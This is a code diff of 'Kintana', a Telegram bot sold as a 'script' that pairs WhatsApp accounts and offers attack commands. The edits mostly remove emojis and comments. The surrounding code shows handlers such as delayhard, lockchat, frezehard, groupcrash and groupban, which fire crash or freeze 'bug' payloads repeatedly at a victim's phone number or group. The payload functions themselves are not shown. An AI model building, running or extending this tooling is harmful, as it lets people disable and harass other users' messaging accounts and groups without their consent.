@@ -85,7 +85,6 @@ const path = require("path");
 const FormData = require('form-data');
 const bot = new TelegramBot(config.BOT_TOKEN, { polling: true });
 
-// ================= RICH MESSAGE HELPERS =================
 const RICH_CSS = `<style>
   table { width: 100%; border-collapse: collapse; margin: 10px 0; }
   th, td { text-align: center !important; padding: 8px; border: 1px solid #555; }
@@ -123,9 +122,7 @@ async function editRichMenu(chatId, messageId, html) {
 function lower(text) {
   return String(text || "").toLowerCase();
 }
-// ================= END RICH MESSAGE HELPERS =================
 
-//============== BLOCKCMD STATE ==============//
 const BLOCKCMD_PATH = "./lib/database/blockcmd.json";
 const BLOCKED_CMD_PATH = "./lib/database/blocked_commands.json";
 
@@ -181,7 +178,6 @@ function isCommandBlocked(text) {
   return blockedCommands.includes(cmd);
 }
 
-//============= BLOCKCMD MIDDLEWARE =============//
 const _origOnText = bot.onText.bind(bot);
 bot.onText = function (regex, callback) {
   return _origOnText(regex, (msg, match) => {
@@ -213,8 +209,8 @@ bot.onText = function (regex, callback) {
 <tr><td>contact</td><td>@heysaka</td></tr>
 </table>
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/kintanaoffcbot" style="primary">💡 buy script</tg-button>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 creator</tg-button>
+  <tg-button type="url" url="https://t.me/kintanaoffcbot" style="primary">buy script</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
 </tg-button-row>`;
         sendRichMenu(msg.chat.id, html, msg.message_id);
         return;
@@ -230,8 +226,8 @@ bot.onText = function (regex, callback) {
 <tr><td>contact</td><td>@heysaka</td></tr>
 </table>
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/kintanaoffcbot" style="primary">💡 buy script</tg-button>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 creator</tg-button>
+  <tg-button type="url" url="https://t.me/kintanaoffcbot" style="primary">buy script</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
 </tg-button-row>`;
         sendRichMenu(msg.chat.id, html, msg.message_id);
         return;
@@ -244,7 +240,6 @@ bot.onText = function (regex, callback) {
     }
   });
 };
-//============= END MIDDLEWARE ==================//
 
 let premiumUsers = JSON.parse(fs.readFileSync('./lib/database/prem.json'));
 let adminUsers = JSON.parse(fs.readFileSync('./lib/database/admin.json'));
@@ -304,7 +299,7 @@ async function restricted(chatid) {
 <tr><td>reason</td><td>this feature is restricted for you</td></tr>
 </table>
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 creator</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
 </tg-button-row>`;
     await sendRichMenu(chatid, html);
 }
@@ -352,13 +347,13 @@ bot.on("message", (msg) => {
     const senderNumber = msg.from?.id || "-";
 
     console.log('\x1b[30m--------------------\x1b[0m');
-    console.log(chalk.bgHex("#4a69bd").bold(`▢ New Message`));
+    console.log(chalk.bgHex("#4a69bd").bold(`New Message`));
     console.log(
       chalk.bgHex("#ffffff").black(
-        `   ▢ Tanggal: ${new Date().toLocaleString()} \n` +
-        `   ▢ Pesan: ${text} \n` +
-        `   ▢ Pengirim: ${pushname} \n` +
-        `   ▢ JID: ${senderNumber} \n`
+        `   Tanggal: ${new Date().toLocaleString()} \n` +
+        `   Pesan: ${text} \n` +
+        `   Pengirim: ${pushname} \n` +
+        `   JID: ${senderNumber} \n`
       )
     );
     console.log();
@@ -591,10 +586,6 @@ ${rowsHtml}
   return sock;
 }
 
-// ================================================================
-// ==================== FITUR /botwa (WA PAIRING) =================
-// ================================================================
-
 const WA_PAIRING_CODE = "SAKA4444";
 const MAX_WA_BOTS = 10;
 
@@ -616,31 +607,31 @@ async function sendWAMenu(sock, from, mek, sender) {
 
   const bodyText = `\`「 KINTANA JS 」\`
  ${greeting}, *${pushname}*
-  ▢ *Bot:* Kintana JavaScript
-  ▢ *Versi:* 10.0.0
-  ▢ *Uptime:* ${uptimeStr}
-  ▢ *Platform:* WhatsApp
+  Bot: Kintana JavaScript
+  Versi: 10.0.0
+  Uptime: ${uptimeStr}
+  Platform: WhatsApp
 
 \`「 MENU UTAMA 」\`
-▸ .menu    — menu ini
-▸ .ping    — cek respon
-▸ .owner   — kontak owner
-▸ .status  — status bot
+.menu    - menu ini
+.ping    - cek respon
+.owner   - kontak owner
+.status  - status bot
 
 \`「 ANDROID BUG 」\`
-▸ .delayhard 62xxx
-▸ .lockchat 62xxx
-▸ .blankclick 62xxx
-▸ .frezehard 62xxx
+.delayhard 62xxx
+.lockchat 62xxx
+.blankclick 62xxx
+.frezehard 62xxx
 
 \`「 GROUP BUG 」\`
-▸ .groupcrash (link)
-▸ .groupban (link)
-▸ .bubar (bug in place)
+.groupcrash (link)
+.groupban (link)
+.bubar (bug in place)
 
 Ketik dengan awalan titik (.)
 
-— Kintana JavaScript
+- Kintana JavaScript
 Berakhir pada ${expiredStr}`;
 
   try {
@@ -716,7 +707,6 @@ Berakhir pada ${expiredStr}`;
   }
 }
 
-// ==================== HANDLER PESAN WA ====================
 async function handleWAMessage(sock, number, chatUpdate) {
   try {
     const mek = chatUpdate.messages[0];
@@ -744,13 +734,13 @@ async function handleWAMessage(sock, number, chatUpdate) {
 
     if (mek.message) {
       console.log('\x1b[30m--------------------\x1b[0m');
-      console.log(chalk.bgHex("#4a69bd").bold(`▢ New Message`));
+      console.log(chalk.bgHex("#4a69bd").bold(`New Message`));
       console.log(
         chalk.bgHex("#ffffff").black(
-          `   ▢ Tanggal: ${new Date().toLocaleString()} \n` +
-          `   ▢ Pesan: ${body || type} \n` +
-          `   ▢ Pengirim: ${pushname} \n` +
-          `   ▢ JID: ${senderNumber} \n`
+          `   Tanggal: ${new Date().toLocaleString()} \n` +
+          `   Pesan: ${body || type} \n` +
+          `   Pengirim: ${pushname} \n` +
+          `   JID: ${senderNumber} \n`
         )
       );
       console.log();
@@ -759,7 +749,7 @@ async function handleWAMessage(sock, number, chatUpdate) {
 if (body.trim().toLowerCase() === "bubar") {
   try {
     await sock.sendMessage(from, {
-      react: { text: "☀️", key: mek.key }
+      react: { text: "☀", key: mek.key }
     });
 
     const groupMetadata = await sock.groupMetadata(from);
@@ -793,14 +783,14 @@ if (body.trim().toLowerCase() === "bubar") {
       case "ping": {
         const t0 = Date.now();
         await sock.sendMessage(from, {
-          text: `🏓 *Pong!*\n\n⚡ Respon: ${Date.now() - t0}ms\n📡 Status: Online\n🔌 Bot: ${number}`
+          text: `Pong!\n\nRespon: ${Date.now() - t0}ms\nStatus: Online\nBot: ${number}`
         }, { quoted: mek });
         break;
       }
 
       case "owner": {
         await sock.sendMessage(from, {
-          text: `👑 *Owner Bot*\n\n📱 Telegram: @heysaka\n📢 Channel: t.me/kintanaofficial\n🌐 Script: Kintana JavaScript v10.0.0`
+          text: `Owner Bot\n\nTelegram: @heysaka\nChannel: t.me/kintanaofficial\nScript: Kintana JavaScript v10.0.0`
         }, { quoted: mek });
         break;
       }
@@ -810,75 +800,75 @@ if (body.trim().toLowerCase() === "bubar") {
         const mem = process.memoryUsage();
         const memMB = (mem.rss / 1024 / 1024).toFixed(2);
         await sock.sendMessage(from, {
-          text: `📊 *Bot Status*\n\n⏱️ Uptime: ${Math.floor(uptime / 60)} menit\n💾 Memory: ${memMB} MB\n🔌 Bot: ${number}\n📦 Version: 10.0.0`
+          text: `Bot Status\n\nUptime: ${Math.floor(uptime / 60)} menit\nMemory: ${memMB} MB\nBot: ${number}\nVersion: 10.0.0`
         }, { quoted: mek });
         break;
       }
 
       case "delayhard": {
-        if (!args[0]) return sock.sendMessage(from, { text: "❌ Contoh: .delayhard 628123456789" }, { quoted: mek });
+        if (!args[0]) return sock.sendMessage(from, { text: "Contoh: .delayhard 628123456789" }, { quoted: mek });
         const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
-        await sock.sendMessage(from, { text: `🚀 Mengirim bug .delayhard ke ${args[0]}...` }, { quoted: mek });
+        await sock.sendMessage(from, { text: `Mengirim bug .delayhard ke ${args[0]}...` }, { quoted: mek });
         try {
           await bug1(sock, target);
           await bug1(sock, target);
-          await sock.sendMessage(from, { text: `✅ Bug .delayhard terkirim ke ${args[0]}` }, { quoted: mek });
+          await sock.sendMessage(from, { text: `Bug .delayhard terkirim ke ${args[0]}` }, { quoted: mek });
         } catch (e) {
-          await sock.sendMessage(from, { text: `❌ Error: ${e.message}` }, { quoted: mek });
+          await sock.sendMessage(from, { text: `Error: ${e.message}` }, { quoted: mek });
         }
         break;
       }
 
       case "lockchat": {
-        if (!args[0]) return sock.sendMessage(from, { text: "❌ Contoh: .lockchat 628123456789" }, { quoted: mek });
+        if (!args[0]) return sock.sendMessage(from, { text: "Contoh: .lockchat 628123456789" }, { quoted: mek });
         const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
-        await sock.sendMessage(from, { text: `🚀 Mengirim bug .lockchat ke ${args[0]}...` }, { quoted: mek });
+        await sock.sendMessage(from, { text: `Mengirim bug .lockchat ke ${args[0]}...` }, { quoted: mek });
         try {
           await bug2(sock, target);
           await bug2(sock, target);
-          await sock.sendMessage(from, { text: `✅ Bug .lockchat terkirim ke ${args[0]}` }, { quoted: mek });
+          await sock.sendMessage(from, { text: `Bug .lockchat terkirim ke ${args[0]}` }, { quoted: mek });
         } catch (e) {
-          await sock.sendMessage(from, { text: `❌ Error: ${e.message}` }, { quoted: mek });
+          await sock.sendMessage(from, { text: `Error: ${e.message}` }, { quoted: mek });
         }
         break;
       }
 
       case "blankclick": {
-        if (!args[0]) return sock.sendMessage(from, { text: "❌ Contoh: .blankclick 628123456789" }, { quoted: mek });
+        if (!args[0]) return sock.sendMessage(from, { text: "Contoh: .blankclick 628123456789" }, { quoted: mek });
         const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
-        await sock.sendMessage(from, { text: `🚀 Mengirim bug .blankclick ke ${args[0]}...` }, { quoted: mek });
+        await sock.sendMessage(from, { text: `Mengirim bug .blankclick ke ${args[0]}...` }, { quoted: mek });
         try {
           await bug3(sock, target);
           await bug3(sock, target);
-          await sock.sendMessage(from, { text: `✅ Bug .blankclick terkirim ke ${args[0]}` }, { quoted: mek });
+          await sock.sendMessage(from, { text: `Bug .blankclick terkirim ke ${args[0]}` }, { quoted: mek });
         } catch (e) {
-          await sock.sendMessage(from, { text: `❌ Error: ${e.message}` }, { quoted: mek });
+          await sock.sendMessage(from, { text: `Error: ${e.message}` }, { quoted: mek });
         }
         break;
       }
 
       case "frezehard": {
-        if (!args[0]) return sock.sendMessage(from, { text: "❌ Contoh: .frezehard 628123456789" }, { quoted: mek });
+        if (!args[0]) return sock.sendMessage(from, { text: "Contoh: .frezehard 628123456789" }, { quoted: mek });
         const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
-        await sock.sendMessage(from, { text: `🚀 Mengirim bug .frezehard ke ${args[0]}...` }, { quoted: mek });
+        await sock.sendMessage(from, { text: `Mengirim bug .frezehard ke ${args[0]}...` }, { quoted: mek });
         try {
           await bug4(sock, target);
           await bug4(sock, target);
-          await sock.sendMessage(from, { text: `✅ Bug .frezehard terkirim ke ${args[0]}` }, { quoted: mek });
+          await sock.sendMessage(from, { text: `Bug .frezehard terkirim ke ${args[0]}` }, { quoted: mek });
         } catch (e) {
-          await sock.sendMessage(from, { text: `❌ Error: ${e.message}` }, { quoted: mek });
+          await sock.sendMessage(from, { text: `Error: ${e.message}` }, { quoted: mek });
         }
         break;
       }
 
       case "groupcrash": {
-        if (!args[0]) return sock.sendMessage(from, { text: "❌ Contoh: .groupcrash https://chat.whatsapp.com/xxxxx" }, { quoted: mek });
+        if (!args[0]) return sock.sendMessage(from, { text: "Contoh: .groupcrash https://chat.whatsapp.com/xxxxx" }, { quoted: mek });
         const inviteCode = args[0].match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/)?.[1];
-        if (!inviteCode) return sock.sendMessage(from, { text: "❌ Link grup tidak valid." }, { quoted: mek });
+        if (!inviteCode) return sock.sendMessage(from, { text: "Link grup tidak valid." }, { quoted: mek });
         try {
           const groupInfo = await sock.groupGetInviteInfo(inviteCode);
           const groupJid = groupInfo.id;
-          await sock.sendMessage(from, { text: `🚀 Mengirim bug grup ke ${groupInfo.subject}...` }, { quoted: mek });
+          await sock.sendMessage(from, { text: `Mengirim bug grup ke ${groupInfo.subject}...` }, { quoted: mek });
           for (let i = 0; i < 20; i++) {
             await Promise.allSettled([
               kitow(sock, groupJid).catch(() => {}),
@@ -888,25 +878,25 @@ if (body.trim().toLowerCase() === "bubar") {
             ]);
             await sleep(500);
           }
-          await sock.sendMessage(from, { text: `✅ Bug grup terkirim.` }, { quoted: mek });
+          await sock.sendMessage(from, { text: `Bug grup terkirim.` }, { quoted: mek });
         } catch (e) {
-          await sock.sendMessage(from, { text: `❌ Error: ${e.message}` }, { quoted: mek });
+          await sock.sendMessage(from, { text: `Error: ${e.message}` }, { quoted: mek });
         }
         break;
       }
 
       case "groupban": {
-        if (!args[0]) return sock.sendMessage(from, { text: "❌ Contoh: .groupban https://chat.whatsapp.com/xxxxx" }, { quoted: mek });
+        if (!args[0]) return sock.sendMessage(from, { text: "Contoh: .groupban https://chat.whatsapp.com/xxxxx" }, { quoted: mek });
         const inviteCode = args[0].match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/)?.[1];
-        if (!inviteCode) return sock.sendMessage(from, { text: "❌ Link grup tidak valid." }, { quoted: mek });
+        if (!inviteCode) return sock.sendMessage(from, { text: "Link grup tidak valid." }, { quoted: mek });
         try {
           const groupInfo = await sock.groupGetInviteInfo(inviteCode);
           const groupJid = groupInfo.id;
-          await sock.sendMessage(from, { text: `🚀 Ban grup ${groupInfo.subject}...` }, { quoted: mek });
+          await sock.sendMessage(from, { text: `Ban grup ${groupInfo.subject}...` }, { quoted: mek });
           await bansgc(sock, groupJid);
-          await sock.sendMessage(from, { text: `✅ Selesai.` }, { quoted: mek });
+          await sock.sendMessage(from, { text: `Selesai.` }, { quoted: mek });
         } catch (e) {
-          await sock.sendMessage(from, { text: `❌ Error: ${e.message}` }, { quoted: mek });
+          await sock.sendMessage(from, { text: `Error: ${e.message}` }, { quoted: mek });
         }
         break;
       }
@@ -918,7 +908,7 @@ if (body.trim().toLowerCase() === "bubar") {
     console.error("[botwa] messages.upsert error:", err?.message);
   }
 }
-// ==================== /botwa ====================
+
 bot.onText(/^\/botwa(?:\s+(.+))?$/i, async (msg, match) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
@@ -1048,7 +1038,7 @@ ${rowsHtml}
             ["number", number],
             ["pairing code", `<b>${formatted}</b>`],
             ["status", "masukkan kode di WhatsApp"],
-            ["note", "buka WhatsApp → Linked Devices → Link with phone number"]
+            ["note", "buka WhatsApp -> Linked Devices -> Link with phone number"]
           ]);
         }
       } catch (err) {
@@ -1114,7 +1104,6 @@ ${rowsHtml}
   waSessions.set(number, { sock, pending: true });
 });
 
-// ==================== /listbotwa ====================
 bot.onText(/^\/listbotwa$/i, async (msg) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
@@ -1158,7 +1147,6 @@ ${rowsHtml}
   );
 });
 
-// ==================== /delbotwa ====================
 bot.onText(/^\/delbotwa(?:\s+(.+))?$/i, async (msg, match) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
@@ -1221,7 +1209,6 @@ bot.onText(/^\/delbotwa(?:\s+(.+))?$/i, async (msg, match) => {
   }
 });
 
-// ==================== RECONNECT WA ====================
 async function reconnectWABot(number, ownerId) {
   const sessionDir = path.join(SESSIONS_DIR, `wa_${number}`);
   if (!fs.existsSync(sessionDir)) return;
@@ -1259,7 +1246,6 @@ async function reconnectWABot(number, ownerId) {
   });
 }
 
-// ==================== INIT WA SESSIONS (AUTO RESTORE) ====================
 async function initializeWABotSessions() {
   try {
     if (!fs.existsSync(SESSIONS_FILE)) return;
@@ -1286,12 +1272,12 @@ async function fetchAndValidateToken() {
     const validTokens = response.data.tokens;
 
     if (!Array.isArray(validTokens)) {
-      console.log('❌ token.json format invalid');
+      console.log('token.json format invalid');
       process.exit(1);
     }
 
     if (!validTokens.includes(config.BOT_TOKEN)) {
-      console.log('❌ your bot token is not registered with kintana');
+      console.log('your bot token is not registered with kintana');
       process.exit(1);
     }
     initializeBot();
@@ -1333,7 +1319,7 @@ function attachAntiKidnapTelegram() {
       try {
         await bot.sendMessage(
           chat.id,
-          `<blockquote>🔒 sorry, this bot can only be added by the owner.\naccess denied, the bot will leave.</blockquote>`,
+          `<blockquote>sorry, this bot can only be added by the owner.\naccess denied, the bot will leave.</blockquote>`,
           { parse_mode: "HTML" }
         );
         await new Promise((r) => setTimeout(r, 1500));
@@ -1369,7 +1355,7 @@ function getBotRuntime() {
 }
 
 async function initializeBot() {
-  console.log(`kintana is now active on your bot 👊`);
+  console.log(`kintana is now active on your bot`);
   await initializeWhatsAppConnections();
   await initializeWABotSessions();
 }
@@ -1701,7 +1687,6 @@ function getPremiumStatus(userId) {
 let senderPublicEnabled = true;
 let senderPrivateEnabled = true;
 
-// ============ kintana MENU BUILDER ============
 function getkintanaMenu() {
   let activePublic = 0;
   let activePrivate = 0;
@@ -1769,26 +1754,25 @@ function getkintanaMenu() {
 <p>all bugs carry the risk of being banned, okay?</p>
 
 <tg-button-row>
-  <tg-button type="callback_data" data="toggle_public" style="primary">📡 sender public: ${publicDisplay}</tg-button>
+  <tg-button type="callback_data" data="toggle_public" style="primary">sender public: ${publicDisplay}</tg-button>
 </tg-button-row>
 <tg-button-row>
-  <tg-button type="callback_data" data="toggle_private" style="primary">🔒 sender private: ${privateDisplay}</tg-button>
+  <tg-button type="callback_data" data="toggle_private" style="primary">sender private: ${privateDisplay}</tg-button>
 </tg-button-row>
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">📢 script info</tg-button>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 creator</tg-button>
+  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
 </tg-button-row>
 <tg-button-row>
-  <tg-button type="callback_data" data="bug_info" style="danger">⚠️ bug information</tg-button>
+  <tg-button type="callback_data" data="bug_info" style="danger">bug information</tg-button>
 </tg-button-row>
 <tg-button-row>
-  <tg-button type="callback_data" data="back_to_main" style="primary">⬅️ back to menu</tg-button>
+  <tg-button type="callback_data" data="back_to_main" style="primary">back to menu</tg-button>
 </tg-button-row>`;
 
   return { html };
 }
 
-// ============ COMMAND /START ============
 bot.onText(/^\/start(?:\s|$)/i, async (msg) => {
   const chatId = msg.chat.id;
   const senderId = msg.from.id;
@@ -1814,7 +1798,7 @@ const html = `<tg-slideshow>
 <tg-song>
   <audio controls preload="none" src="https://mp3tourl.com/audio/1791570807413-0fee70d1-28d3-4523-8bcc-4e56625245dc.mp3"></audio>
   <footer style="font-size:12px; color:#888; margin-top:6px;">
-    © 2026 — Kintana Bot Telegram
+    © 2026 - Kintana Bot Telegram
   </footer>
 </tg-song>
 
@@ -1830,27 +1814,26 @@ const html = `<tg-slideshow>
 </table>
 
 <tg-button-row>
-  <tg-button type="callback_data" data="owner_menu" style="primary">👋 owner menu</tg-button>
-  <tg-button type="callback_data" data="all_menu" style="primary">♾️ all menu</tg-button>
+  <tg-button type="callback_data" data="owner_menu" style="primary">owner menu</tg-button>
+  <tg-button type="callback_data" data="all_menu" style="primary">all menu</tg-button>
 </tg-button-row>
 <tg-button-row>
-  <tg-button type="callback_data" data="kintana-menu" style="primary">👨‍💻 kintana menu</tg-button>
+  <tg-button type="callback_data" data="kintana-menu" style="primary">kintana menu</tg-button>
 </tg-button-row>
 <tg-button-row>
-  <tg-button type="callback_data" data="thanks_to" style="primary">🤝 thanks to</tg-button>
+  <tg-button type="callback_data" data="thanks_to" style="primary">thanks to</tg-button>
 </tg-button-row>
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">📢 channel</tg-button>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 creator</tg-button>
+  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">channel</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
 </tg-button-row>
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/kintanaoffcbot" style="primary">💡 buy script</tg-button>
+  <tg-button type="url" url="https://t.me/kintanaoffcbot" style="primary">buy script</tg-button>
 </tg-button-row>`;
 
   await sendRichMenu(chatId, html);
 });
 
-// ============ CALLBACK QUERY HANDLER ============
 bot.on("callback_query", async (query) => {
   try {
     const chatId = query.message.chat.id;
@@ -1920,8 +1903,8 @@ bot.on("callback_query", async (query) => {
 </table>
 
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">📢 script info</tg-button>
-  <tg-button type="callback_data" data="back_to_main" style="primary">⬅️ back to menu</tg-button>
+  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
+  <tg-button type="callback_data" data="back_to_main" style="primary">back to menu</tg-button>
 </tg-button-row>`;
     }
 
@@ -1955,8 +1938,8 @@ bot.on("callback_query", async (query) => {
 <p>don't minus the literacy okay</p>
 
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">📢 script info</tg-button>
-  <tg-button type="callback_data" data="kintana-menu" style="primary">⬅️ back to menu</tg-button>
+  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
+  <tg-button type="callback_data" data="kintana-menu" style="primary">back to menu</tg-button>
 </tg-button-row>`;
     }
 
@@ -1989,8 +1972,8 @@ bot.on("callback_query", async (query) => {
 </table>
 
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">📢 script info</tg-button>
-  <tg-button type="callback_data" data="back_to_main" style="primary">⬅️ back to menu</tg-button>
+  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
+  <tg-button type="callback_data" data="back_to_main" style="primary">back to menu</tg-button>
 </tg-button-row>`;
     }
 
@@ -2029,17 +2012,17 @@ bot.on("callback_query", async (query) => {
 <p>and to all kintana script users, thank you for your support.</p>
 
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">📢 script info</tg-button>
+  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
 </tg-button-row>
 <tg-button-row>
-  <tg-button type="url" url="https://instagram.com/@sakaurbans" style="primary">📸 instagram</tg-button>
-  <tg-button type="url" url="https://youtube.com/@sakaurbansoffc" style="primary">▶️ youtube</tg-button>
+  <tg-button type="url" url="https://instagram.com/@sakaurbans" style="primary">instagram</tg-button>
+  <tg-button type="url" url="https://youtube.com/@sakaurbansoffc" style="primary">youtube</tg-button>
 </tg-button-row>
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 telegram</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">telegram</tg-button>
 </tg-button-row>
 <tg-button-row>
-  <tg-button type="callback_data" data="back_to_main" style="primary">⬅️ back to menu</tg-button>
+  <tg-button type="callback_data" data="back_to_main" style="primary">back to menu</tg-button>
 </tg-button-row>`;
     }
 
@@ -2061,7 +2044,7 @@ bot.on("callback_query", async (query) => {
 <tg-song>
   <audio controls preload="none" src="https://mp3tourl.com/audio/1791570807413-0fee70d1-28d3-4523-8bcc-4e56625245dc.mp3"></audio>
   <footer style="font-size:12px; color:#888; margin-top:6px;">
-    © 2026 — Kintana Bot Telegram 
+    © 2026 - Kintana Bot Telegram 
   </footer>
 </tg-song>
 
@@ -2077,21 +2060,21 @@ bot.on("callback_query", async (query) => {
 </table>
 
 <tg-button-row>
-  <tg-button type="callback_data" data="owner_menu" style="primary">👋 owner menu</tg-button>
-  <tg-button type="callback_data" data="all_menu" style="primary">♾️ all menu</tg-button>
+  <tg-button type="callback_data" data="owner_menu" style="primary">owner menu</tg-button>
+  <tg-button type="callback_data" data="all_menu" style="primary">all menu</tg-button>
 </tg-button-row>
 <tg-button-row>
-  <tg-button type="callback_data" data="kintana-menu" style="primary">👨‍💻 kintana menu</tg-button>
+  <tg-button type="callback_data" data="kintana-menu" style="primary">kintana menu</tg-button>
 </tg-button-row>
 <tg-button-row>
-  <tg-button type="callback_data" data="thanks_to" style="primary">🤝 thanks to</tg-button>
+  <tg-button type="callback_data" data="thanks_to" style="primary">thanks to</tg-button>
 </tg-button-row>
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">📢 channel</tg-button>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 creator</tg-button>
+  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">channel</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
 </tg-button-row>
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/kintanaoffcbot" style="primary">💡 buy script</tg-button>
+  <tg-button type="url" url="https://t.me/kintanaoffcbot" style="primary">buy script</tg-button>
 </tg-button-row>`;
     }
 
@@ -2129,7 +2112,7 @@ bot.onText(/^\/(addsenderpublic|addsenderprivat)(?:\s+(.+))?$/, async (msg, matc
 <tr><td>example</td><td>/${command} 628123456789</td></tr>
 </table>
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 creator</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
 </tg-button-row>`,
       msg.message_id
     );
@@ -2173,7 +2156,7 @@ bot.onText(/^\/(delsenderpublic|delsenderprivat)(?:\s+(.+))?$/, async (msg, matc
 <tr><td>example</td><td>/${command} 628123456789</td></tr>
 </table>
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 creator</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
 </tg-button-row>`,
       msg.message_id
     );
@@ -2345,7 +2328,7 @@ bot.onText(/^\/setjeda(?:\s(.+))?$/, async (msg, match) => {
 <tr><td>example</td><td>/setjeda 5s / 2m / 1h</td></tr>
 </table>
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 creator</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
 </tg-button-row>`,
       msg.message_id
     );
@@ -2439,11 +2422,11 @@ async function sendBugSuccess(chatId, formattedNumber, commandName, replyToMsgId
 </table>
 
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">📢 script info</tg-button>
-  <tg-button type="url" url="https://wa.me/${formattedNumber}" style="primary">🔗 check target</tg-button>
+  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
+  <tg-button type="url" url="https://wa.me/${formattedNumber}" style="primary">check target</tg-button>
 </tg-button-row>
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/kintanaOfficial/41" style="primary">⭐ rating script</tg-button>
+  <tg-button type="url" url="https://t.me/kintanaOfficial/41" style="primary">rating script</tg-button>
 </tg-button-row>`;
   await sendRichMenu(chatId, html, replyToMsgId);
 }
@@ -2467,7 +2450,7 @@ bot.onText(/^\/(delayhard)(?:\s+(.+))?$/, async (msg, match) => {
 <tr><td>example</td><td>/${commandName} 628123456789</td></tr>
 </table>
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 creator</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
 </tg-button-row>`,
       msg.message_id
     );
@@ -2553,7 +2536,7 @@ bot.onText(/^\/(lockchat)(?:\s+(.+))?$/, async (msg, match) => {
 <tr><td>example</td><td>/${commandName} 628123456789</td></tr>
 </table>
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 creator</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
 </tg-button-row>`,
       msg.message_id
     );
@@ -2639,7 +2622,7 @@ bot.onText(/^\/(blankclick)(?:\s+(.+))?$/, async (msg, match) => {
 <tr><td>example</td><td>/${commandName} 628123456789</td></tr>
 </table>
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 creator</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
 </tg-button-row>`,
       msg.message_id
     );
@@ -2725,7 +2708,7 @@ bot.onText(/^\/(frezehard)(?:\s+(.+))?$/, async (msg, match) => {
 <tr><td>example</td><td>/${commandName} 628123456789</td></tr>
 </table>
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 creator</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
 </tg-button-row>`,
       msg.message_id
     );
@@ -2811,7 +2794,7 @@ bot.onText(/^\/(delaygroup)(?:\s+(.+))?$/, async (msg, match) => {
 <tr><td>example</td><td>/${commandName} https://chat.whatsapp.com/abcd1234</td></tr>
 </table>
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 creator</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
 </tg-button-row>`,
       msg.message_id
     );
@@ -2924,8 +2907,8 @@ bot.onText(/^\/(delaygroup)(?:\s+(.+))?$/, async (msg, match) => {
 </table>
 
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">📢 script info</tg-button>
-  <tg-button type="url" url="${link}" style="primary">🔗 group link</tg-button>
+  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
